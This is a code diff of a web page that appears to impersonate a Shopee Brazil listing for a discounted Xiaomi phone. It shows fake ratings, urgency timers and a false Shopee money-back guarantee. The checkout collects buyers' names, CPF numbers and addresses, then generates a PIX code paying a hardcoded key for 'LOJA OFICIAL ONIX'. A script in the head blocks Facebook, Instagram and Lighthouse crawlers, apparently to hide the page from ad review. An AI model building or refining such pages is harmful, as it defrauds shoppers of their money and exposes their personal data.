@@ -13,8 +13,6 @@
     <meta property="og:description" content="Análise técnica de hardware e compatibilidade de redes móveis.">
     <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-
     <script>
     (function() {
         const botsBloqueados = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'fna.fbcdn', 'lookaside', 'instagram', 'lighthouse'];
@@ -61,6 +59,13 @@
         .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
         .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; display: inline-block; vertical-align: middle; }
 
+        .section-box { background: white; padding: 15px; margin-bottom: 8px; }
+        .section-title { font-size: 14px; font-weight: 500; color: #222; margin-bottom: 12px; text-transform: uppercase; }
+        .spec-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f2f2f2; font-size: 13px; }
+        .spec-label { width: 120px; color: #757575; }
+        .spec-value { flex: 1; color: #222; }
+        .desc-text { font-size: 13px; color: #555; line-height: 1.6; white-space: pre-line; }
+
         .shop-section { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
         .shop-info { display: flex; align-items: center; gap: 10px; position: relative; }
         .shop-avatar { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #eee; }
@@ -69,6 +74,14 @@
         .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; }
 
         .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .product-ratings-header__left { display: flex; flex-direction: column; gap: 4px; }
+        .product-ratings-header-title { color: #222; font-size: 14px; font-weight: 500; }
+        .product-ratings-header__stats { display: flex; align-items: center; gap: 5px; text-decoration: none; color: #222; }
+        .VUvows { width: 10px; height: 10px; }
+        .product-ratings-header__stats-avg { color: var(--shopee); font-weight: bold; font-size: 12px; }
+        .product-ratings-header__stats-count { color: #757575; font-size: 12px; }
+        .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 4px; }
+
         .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
         .user-info { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; }
         .review-media { display: flex; gap: 6px; overflow-x: auto; margin-top: 10px; }
@@ -77,18 +90,22 @@
         .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
         .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
 
-        /* ESTILOS NOVOS DO CHECKOUT */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
-        .modal-content { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 12px 12px 0 0; max-height: 90vh; overflow-y: auto; }
-        .section-card { background: white; padding: 12px; margin-bottom: 8px; }
-        .address-line { height: 3px; width: 100%; background: repeating-linear-gradient(45deg, #ff4d2d, #ff4d2d 10px, #fff 10px, #fff 20px, #0055aa 20px, #0055aa 30px, #fff 30px, #fff 40px); }
+        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
-        .shipping-option { border: 1px solid #e8e8e8; padding: 12px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; border-radius: 2px; cursor: pointer; }
-        .shipping-option.selected { border-color: var(--teal); background-color: #f6fffe; }
-        .insurance-box { display: flex; align-items: center; justify-content: space-between; padding: 12px; border: 1px solid #eee; border-radius: 4px; }
+        .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
+        .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
+        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
+        .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
+        
+        /* Ajuste para remover as linhas coloridas e organizar novos campos */
+        .qty-container { display: flex; align-items: center; justify-content: space-between; padding: 10px; background: #fafafa; border-radius: 4px; margin: 10px 0; }
+        .qty-btn { width: 32px; height: 32px; border: 1px solid #ddd; background: #fff; font-size: 18px; border-radius: 4px; }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 </head>
 <body>
 
@@ -131,6 +148,22 @@
         <a href="https://shopee.com.br/shop/1078992312" class="shop-btn">Ver Loja</a>
     </div>
 
+    <div class="product-ratings-header__wrapper">
+        <div class="product-ratings-header__left">
+            <div class="product-ratings-header-title">Avaliações do produto</div>
+            <div class="product-ratings-header__stats">
+                <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/8221e9a289d23c23cef9.svg" class="VUvows">
+                <img src="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/rating/e795434a48ef42f9a279.svg" class="VUvows">
+                <div class="product-ratings-header__stats-avg">4.9/5</div>
+                <div class="product-ratings-header__stats-count">(2mil resenhas)</div>
+            </div>
+        </div>
+        <a class="product-ratings-header__see-all" href="#">Ver tudo <i class="fas fa-chevron-right" style="font-size:10px;"></i></a>
+    </div>
+
     <div class="review-item">
         <div class="user-info">luizadriano871 <span style="color:#999; font-size:10px;">• 2 dias atrás</span></div>
         <div style="color:#ee4d2d; font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
@@ -152,8 +185,7 @@
 
     <div id="modal" class="modal">
         <div class="modal-content">
-            
-            <div id="selection-screen" class="section-card">
+            <div id="selection-screen">
                 <div style="display:flex; align-items:center; margin-bottom:15px;">
                     <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
                     <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
@@ -166,117 +198,58 @@
                     <button class="opt-btn" onclick="selectVar(this)">IRON MAN</button>
                 </div>
                 <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
+                <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR</button>
             </div>
 
-            <div id="form-screen" style="display:none;" class="section-card">
-                <p style="font-weight:bold; margin-bottom:15px;">Dados de Entrega</p>
+            <div id="form-screen" style="display:none;">
+                <p style="font-weight:bold; margin-bottom:15px; font-size:14px;">Dados de Entrega</p>
                 <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
-                <input type="tel" id="cpf" class="input-box" placeholder="CPF">
-                <div style="display:flex; gap:8px;">
-                    <input type="tel" id="cep" class="input-box" placeholder="CEP">
-                    <button onclick="buscarCEP()" style="background:#222; color:#fff; border:none; padding:0 15px; border-radius:4px; margin-bottom:10px; font-size:12px;">BUSCAR</button>
+                <input type="tel" id="cpf" class="input-box" placeholder="CPF" maxlength="11">
+                
+                <div class="cep-row">
+                    <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP" maxlength="8">
+                    <button class="btn-cep" onclick="buscarCEP()" style="background:#ee4d2d;">BUSCAR CEP</button>
                 </div>
-                <input type="text" id="rua" class="input-box" placeholder="Endereço Completo (Rua, Número, Bairro)">
-                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="goToCheckout()">PRÓXIMO</button>
+                
+                <div style="display:grid; grid-template-columns: 3fr 1fr; gap:8px;">
+                    <input type="text" id="rua" class="input-box" placeholder="Endereço">
+                    <input type="text" id="numero" class="input-box" placeholder="Nº">
+                </div>
+                
+                <input type="text" id="bairro" class="input-box" placeholder="Bairro">
+                <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
+
+                <div class="qty-container">
+                    <span style="font-size:14px;">Quantidade:</span>
+                    <div style="display:flex; align-items:center; gap:12px;">
+                        <button class="qty-btn" onclick="alterarQtd(-1)">-</button>
+                        <span id="qtd-display" style="font-weight:bold;">1</span>
+                        <button class="qty-btn" onclick="alterarQtd(1)">+</button>
+                    </div>
+                </div>
+
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="finalizar()">GERAR PIX</button>
+                <button class="btn-voltar" onclick="document.getElementById('form-screen').style.display='none'; document.getElementById('selection-screen').style.display='block';">VOLTAR</button>
             </div>
 
-            <div id="step-3" style="display:none; padding-bottom:80px;">
-                <div class="section-card">
-                    <div style="display:flex; align-items:flex-start; gap:10px;">
-                        <i class="fas fa-map-marker-alt" style="color:var(--shopee); margin-top:3px;"></i>
-                        <div style="flex:1;">
-                            <div style="display:flex; justify-content:space-between; align-items:center;">
-                                <b id="resumo-nome" style="font-size:14px; color:#222;"></b>
-                                <span style="font-size:12px; color:#666;" id="resumo-tel">(88) 99980-6107</span>
-                            </div>
-                            <p id="resumo-end" style="font-size:13px; color:#666; margin:4px 0; line-height:1.4;"></p>
-                            <div style="display:flex; align-items:center; gap:5px; margin-top:5px;">
-                                <span style="border:1px solid #ddd; padding:1px 4px; border-radius:2px; font-size:10px; color:#888;">CPF</span>
-                                <span id="resumo-cpf" style="font-size:12px; color:#444;"></span>
-                            </div>
-                        </div>
-                        <i class="fas fa-chevron-right" style="color:#bbb; font-size:12px; margin-top:5px;"></i>
-                    </div>
-                    <div class="address-line" style="margin-top:12px;"></div>
-                </div>
-
-                <div class="section-card">
-                    <div style="font-size:13px; margin-bottom:12px; font-weight: 500;">
-                        <i class="fas fa-store" style="font-size:12px;"></i> Bestbuytech
-                    </div>
-                    <div style="display:flex; gap:12px;">
-                        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; object-fit: cover; border-radius:2px;">
-                        <div style="flex:1">
-                            <p style="font-size:13px; color:#222; line-height:1.4;">Smartphone Xiaomi Poco X7 Pro 5G Versão Global</p>
-                            <p style="font-size:12px; color:#888; background:#f5f5f5; display:inline-block; padding:2px 6px; margin:5px 0;">
-                                Cor: <span id="resumo-cor" style="font-weight:500;"></span>, 512GB-12GB
-                            </p>
-                            <p style="font-size:11px; color:var(--teal); font-weight:500;">+ Fone de ouvido + Carregador Original + Cabo USB</p>
-                            <div style="display:flex; justify-content:space-between; align-items: flex-end; margin-top: 8px;">
-                                <b style="color:var(--shopee); font-size: 16px;">R$599,00</b>
-                                <span style="color: #757575; font-size: 13px;">x1</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="insurance-box" style="margin-top:15px; background:#fafafa;">
-                        <div style="font-size:12px;">
-                            <div style="display:flex; align-items:center; gap:5px;">
-                                <b style="color:#222;">Adquirir Seguro</b>
-                                <span style="background:var(--shopee); color:#fff; font-size:9px; padding:1px 4px; border-radius:2px;">Recomendado</span>
-                            </div>
-                            <p style="color:#757575; font-size:11px; margin-top:4px;">Seguro contra Roubo e Dano - 12 meses</p>
-                        </div>
-                        <div style="display:flex; align-items:center; gap:10px;">
-                            <b style="font-size:13px;">R$42,00</b>
-                            <input type="checkbox" id="check-seguro" onchange="updateTotal()" style="width:18px; height:18px; accent-color:var(--shopee);">
-                        </div>
-                    </div>
-                </div>
-
-                <div class="section-card">
-                    <p style="font-size:14px; font-weight: 500; margin-bottom:10px;">Opção de Envio</p>
-                    <div class="shipping-option" id="opt-rapido" onclick="setFrete(62, 'rapido')">
-                        <div>
-                            <b style="font-size:13px;">Rápido (5-6 dias)</b>
-                            <p id="data-rapida" style="color: var(--teal); font-size: 12px;"></p>
-                        </div>
-                        <b>R$62,00</b>
-                    </div>
-                    <div class="shipping-option selected" id="opt-gratis" onclick="setFrete(0, 'gratis')">
-                        <div>
-                            <b style="font-size:13px;">Grátis (8-10 dias)</b>
-                            <p id="data-gratis" style="color: var(--teal); font-size: 12px;"></p>
-                        </div>
-                        <b style="color: var(--teal)">Grátis</b>
-                    </div>
-                </div>
-
-                <div style="position:fixed; bottom:0; width:100%; background:#fff; padding:10px; display:flex; align-items:center; border-top:1px solid #eee;">
-                    <div style="flex:1; text-align:right; padding-right:15px;">
-                        <span style="font-size:12px; color:#757575;">Total do Pedido:</span><br>
-                        <b id="total-txt" style="color:var(--shopee); font-size:18px;">R$599,00</b>
-                    </div>
-                    <button onclick="finalizar()" style="background:var(--shopee); color:#fff; border:none; padding:12px 25px; font-weight:bold; border-radius:2px;">FAZER PEDIDO</button>
-                </div>
-            </div>
-
-            <div id="pix-screen" style="display:none; text-align:center;" class="section-card">
+            <div id="pix-screen" style="display:none; text-align:center;">
                 <div class="garantia-shopee">
                     <i class="fas fa-shield-alt"></i>
                     <span>Se o produto não for entregue,<br>a Shopee devolve seu dinheiro!</span>
                 </div>
-                <p style="font-weight:bold; color:var(--teal);">Código PIX Gerado!</p>
-                <img id="qrc" src="" style="width:180px; margin:15px 0;">
-                <div id="pix-code" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border: 1px dashed #ccc;"></div>
-                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px; margin-top:10px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
+                <p style="font-weight:bold; color:var(--teal); margin-bottom: 5px;">Código PIX Gerado!</p>
+                <p id="total-venda" style="font-weight:bold; margin-bottom:10px;"></p>
+                <img id="qrc" src="" style="margin:10px 0; width:180px;">
+                <div id="pix-code" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; margin-bottom:15px; border: 1px dashed #ccc;"></div>
+                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
             </div>
         </div>
     </div>
 
     <script>
         let selectedVar = null;
-        let freteVal = 0;
+        let quantidade = 1;
+        const precoUnitario = 599.00;
 
         function openModal() { document.getElementById('modal').style.display='block'; }
         
@@ -292,73 +265,50 @@
             document.getElementById('form-screen').style.display='block';
         }
 
+        function alterarQtd(val) {
+            quantidade += val;
+            if(quantidade < 1) quantidade = 1;
+            document.getElementById('qtd-display').innerText = quantidade;
+        }
+
         async function buscarCEP() {
             let cep = document.getElementById('cep').value.replace(/\D/g, '');
             if(cep.length === 8) {
                 let r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                 let d = await r.json();
-                if(!d.erro) document.getElementById('rua').value = d.logradouro + ", " + d.bairro + ", " + d.localidade;
+                if(!d.erro) {
+                    document.getElementById('rua').value = d.logradouro;
+                    document.getElementById('bairro').value = d.bairro;
+                    document.getElementById('cidade').value = d.localidade + " / " + d.uf;
+                }
             }
         }
 
-        function goToCheckout() {
+        function finalizar() {
             const n = document.getElementById('nome').value;
             const c = document.getElementById('cpf').value;
             const r = document.getElementById('rua').value;
-            if(!n || !c || !r) return alert("Preencha todos os campos.");
+            if(!n || !c || !r) return alert("Preencha os dados de entrega.");
 
-            document.getElementById('form-screen').style.display='none';
-            document.getElementById('step-3').style.display='block';
-            
-            document.getElementById('resumo-nome').innerText = n;
-            document.getElementById('resumo-cpf').innerText = c;
-            document.getElementById('resumo-end').innerText = r;
-            document.getElementById('resumo-cor').innerText = selectedVar;
-            
-            calcDates();
-            updateTotal();
-        }
+            let totalVal = (precoUnitario * quantidade).toFixed(2);
+            document.getElementById('total-venda').innerText = "Total: R$ " + totalVal.replace('.',',');
 
-        function calcDates() {
-            const meses = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
-            const f = (d) => {
-                let date = new Date();
-                date.setDate(date.getDate() + d);
-                return date.getDate() + " de " + meses[date.getMonth()];
-            };
-            document.getElementById('data-rapida').innerText = `Receba entre ${f(5)} e ${f(6)}`;
-            document.getElementById('data-gratis').innerText = `Receba entre ${f(8)} e ${f(10)}`;
-        }
-
-        function setFrete(v, tipo) {
-            freteVal = v;
-            document.getElementById('opt-rapido').classList.toggle('selected', tipo=='rapido');
-            document.getElementById('opt-gratis').classList.toggle('selected', tipo=='gratis');
-            updateTotal();
-        }
-
-        function updateTotal() {
-            let total = 599 + freteVal;
-            if(document.getElementById('check-seguro').checked) total += 42;
-            document.getElementById('total-txt').innerText = "R$" + total.toFixed(2).replace('.',',');
-        }
-
-        function finalizar() {
-            let totalVal = (599 + freteVal + (document.getElementById('check-seguro').checked ? 42 : 0)).toFixed(2);
+            // Gera o código PIX dinâmico com base no valor total
             let pixFinal = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540" + totalVal + "5802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
             
-            document.getElementById('step-3').style.display='none';
+            document.getElementById('form-screen').style.display='none';
             document.getElementById('pix-screen').style.display='block';
             document.getElementById('pix-code').innerText = pixFinal;
             document.getElementById('qrc').src = "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" + encodeURIComponent(pixFinal);
         }
 
         function copiarPix() {
-            navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
+            const code = document.getElementById('pix-code').innerText;
+            navigator.clipboard.writeText(code);
             alert('Copiado!');
         }
 
-        // TIMER PRESERVADO
+        // TIMER
         let totalSeconds = 5400;
         setInterval(() => {
             let h = Math.floor(totalSeconds / 3600), m = Math.floor((totalSeconds % 3600) / 60), s = totalSeconds % 60;
